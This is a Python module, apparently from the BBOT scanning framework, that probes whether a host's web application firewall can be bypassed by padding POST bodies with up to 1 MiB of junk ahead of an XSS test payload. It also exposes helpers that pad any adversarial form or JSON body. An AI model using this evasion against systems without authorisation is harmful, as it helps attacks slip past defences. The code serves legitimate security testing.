import asyncio
import logging
from dataclasses import dataclass, field
from urllib.parse import quote as _urlquote

from bbot.errors import HttpCompareError

log = logging.getLogger("bbot.core.helpers.nowafpls")


# Padding sizes to try, largest first. A bigger pad is likelier to outrun the WAF's
# inspection buffer, but 1 MiB is exactly nginx's default `client_max_body_size`, so
# the second rung exists to clear that ceiling on origins that enforce it.
DEFAULT_PADDING_SIZES = [1048576, 131072]
DEFAULT_PAYLOAD = "<script>alert(1)</script>"
# Field name used to carry the junk padding in POST bodies. The double-underscore
# prefix keeps it out of the way of legitimate form fields when lightfuzz merges
# the pad into a real form.
PADDING_FIELD_NAME = "__nowafpls_pad"
# Only an explicit 413 is treated as "the body was too big". A dropped connection is
# ambiguous (the WAF may have killed it), and IIS reports maxAllowedContentLength as a
# plain 404, so neither can be told apart from interference without guessing.
SIZE_REJECTION_CODES = (413,)


@dataclass
class BypassResult:
    """
    Verdict from a nowafpls probe against a single host.

    `status` is one of the STATUS_* class constants. `bypassed` is a convenience
    boolean for the common "should I retry my probe with padding" question.
    `padding_size` is the size that produced the verdict, which is what callers
    must pad with so the exploit matches what was actually tested.
    """

    STATUS_NO_INTERFERENCE = "no_interference"
    STATUS_BYPASSED = "bypassed"
    STATUS_BLOCKED = "blocked"
    STATUS_TOO_LARGE = "too_large"
    STATUS_ERROR = "error"

    status: str
    padding_size: int = 0
    payload: str = DEFAULT_PAYLOAD
    waf_provider: str = ""
    error: str = ""
    diff_reasons: list = field(default_factory=list)

    @property
    def bypassed(self) -> bool:
        return self.status == self.STATUS_BYPASSED

    @property
    def summary(self) -> str:
        """One-line verdict for logging, shared by every consumer of the probe."""
        parts = [f"status={self.status}", f"provider={self.waf_provider or 'unknown'}"]
        if self.padding_size:
            parts.append(f"padding_size={self.padding_size}")
        if self.error:
            parts.append(f"error={self.error}")
        if self.diff_reasons:
            parts.append(f"diff_reasons={','.join(str(r) for r in self.diff_reasons)}")
        return " ".join(parts)


class NowafplsHelper:
    """
    Determine whether a host's WAF / inspection layer can be bypassed by prepending
    a large junk padding to the malicious portion of a POST body.

    Detection is provider-agnostic: we baseline the endpoint with a benign body,
    then compare the malicious unpadded and malicious padded responses against
    that baseline via `helpers.http_compare`. Interpretation:

      * unpadded matches baseline           -> nothing was gating the payload; no bypass to demonstrate
      * unpadded differs, padded matches    -> bypass works
      * both differ from baseline           -> gate held; padding did not help
      * every padding size drew a 413       -> the origin caps body size; padding is unavailable

    A request the WAF kills outright (timeout / connection reset) counts as "differs",
    not as a match, so a dropped connection reads as interference rather than acceptance.

    Padding size and payload are owned here rather than passed per call, so that every
    consumer (the nowafpls module, lightfuzz, ajaxpro, generic_ssrf) pads with the size
    the probe actually validated.

    Results are memoized per host for the scan's lifetime. Concurrent callers hit
    the same in-flight `asyncio.Task`, so exactly one probe runs per host.
    """

    def __init__(self, parent_helper):
        self.parent_helper = parent_helper
        self._per_host: dict[str, asyncio.Task] = {}
        web_config = getattr(parent_helper, "web_config", None) or {}
        sizes = {int(s) for s in (web_config.get("nowafpls_padding_sizes") or DEFAULT_PADDING_SIZES)}
        # descending, so the probe starts with the pad likeliest to clear the inspection buffer
        self.padding_sizes = sorted((s for s in sizes if s > 0), reverse=True) or list(DEFAULT_PADDING_SIZES)
        self.payload = web_config.get("nowafpls_payload") or DEFAULT_PAYLOAD

    @staticmethod
    def pad_value(size: int) -> str:
        return "A" * size

    async def is_bypassable(self, event) -> BypassResult:
        """
        Probe the host and return a BypassResult. First caller runs the probe;
        concurrent callers await the same Task and get the cached verdict.
        """
        host = str(event.host)
        new_probe = host not in self._per_host
        if new_probe:
            self._per_host[host] = asyncio.create_task(self._probe(event))
        result = await self._per_host[host]
        if new_probe:
            # one line per host, so the verdict is on the record regardless of which module asked
            log.verbose(f"nowafpls: {event.url}: {result.summary}")
        return result

    async def pad_form_body(self, event, body: str) -> str:
        """Prepend a large junk field to a form-urlencoded POST body when the host's WAF is
        bypassable. No-op for events without a ``waf`` tag or hosts where padding doesn't help.
        Callers can drop this in around any adversarial POST body; the return value is either
        the original body or the padded version, and callers compare (or track locally) if they
        need to know whether the pad was applied."""
        if "waf" not in event.tags:
            return body
        result = await self.is_bypassable(event)
        if not result.bypassed:
            return body
        pad = f"{PADDING_FIELD_NAME}={self.pad_value(result.padding_size)}"
        return f"{pad}&{body}" if body else pad

    async def pad_json(self, event, data):
        """Prepend a junk padding key to a JSON dict body when the host's WAF is bypassable.
        No-op for events without a ``waf`` tag, non-bypassable hosts, or non-dict bodies."""
        if "waf" not in event.tags or not isinstance(data, dict):
            return data
        result = await self.is_bypassable(event)
        if not result.bypassed:
            return data
        return {PADDING_FIELD_NAME: self.pad_value(result.padding_size), **data}

    async def _probe(self, event) -> BypassResult:
        url = event.url
        provider = self._identify_provider(event)
        encoded_payload = _urlquote(self.payload, safe="")
        benign_body = "q=hello"
        unpadded_body = f"q={encoded_payload}"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        compare = self.parent_helper.http_compare(
            url,
            method="POST",
            data=benign_body,
            headers=headers,
            include_cache_buster=False,
        )

        try:
            match_unpadded, reasons_unpadded, *_ = await compare.compare(
                url, method="POST", data=unpadded_body, headers=headers, none_is_match=False
            )
        except HttpCompareError as e:
            return BypassResult(
                status=BypassResult.STATUS_ERROR,
                payload=self.payload,
                waf_provider=provider,
                error=f"could not baseline {url}: {e}",
            )

        if match_unpadded:
            return BypassResult(
                status=BypassResult.STATUS_NO_INTERFERENCE,
                payload=self.payload,
                waf_provider=provider,
            )

        # Walk the ladder largest-first, stepping down only on an explicit size rejection.
        # A WAF that held at one size will only hold harder at a smaller one, so any other
        # outcome is the final verdict.
        for padding_size in self.padding_sizes:
            log.debug(f"nowafpls: probing {url} with {padding_size} bytes of padding")
            padded_body = f"{PADDING_FIELD_NAME}={self.pad_value(padding_size)}&q={encoded_payload}"
            try:
                match_padded, reasons_padded, _, padded_response = await compare.compare(
                    url, method="POST", data=padded_body, headers=headers, none_is_match=False
                )
            except HttpCompareError as e:
                return BypassResult(
                    status=BypassResult.STATUS_ERROR,
                    padding_size=padding_size,
                    payload=self.payload,
                    waf_provider=provider,
                    error=f"padded compare failed for {url}: {e}",
                    diff_reasons=list(reasons_unpadded),
                )

            if padded_response is not None and padded_response.status_code in SIZE_REJECTION_CODES:
                log.debug(
                    f"nowafpls: {url} rejected a {padding_size}-byte pad with "
                    f"HTTP {padded_response.status_code}; trying a smaller one"
                )
                continue

            if match_padded:
                return BypassResult(
                    status=BypassResult.STATUS_BYPASSED,
                    padding_size=padding_size,
                    payload=self.payload,
                    waf_provider=provider,
                    diff_reasons=list(reasons_unpadded),
                )
            return BypassResult(
                status=BypassResult.STATUS_BLOCKED,
                padding_size=padding_size,
                payload=self.payload,
                waf_provider=provider,
                diff_reasons=list(reasons_padded),
            )

        return BypassResult(
            status=BypassResult.STATUS_TOO_LARGE,
            padding_size=self.padding_sizes[-1],
            payload=self.payload,
            waf_provider=provider,
            error=f"origin rejected every padding size {self.padding_sizes} as too large",
            diff_reasons=list(reasons_unpadded),
        )

    @staticmethod
    def _identify_provider(event) -> str:
        """
        Look up the WAF/CDN provider name from cloudcheck's host_metadata, if any.
        Returns a display-cased name like "Cloudflare" or empty string if unknown.
        """
        metadata = getattr(event, "host_metadata", None) or {}
        for host_data in metadata.values():
            cloud_providers = host_data.get("cloud_providers") or {}
            for name, info in cloud_providers.items():
                types = info.get("types") or []
                if any(t in ("waf", "cdn") for t in types):
                    return name.title()
        return ""
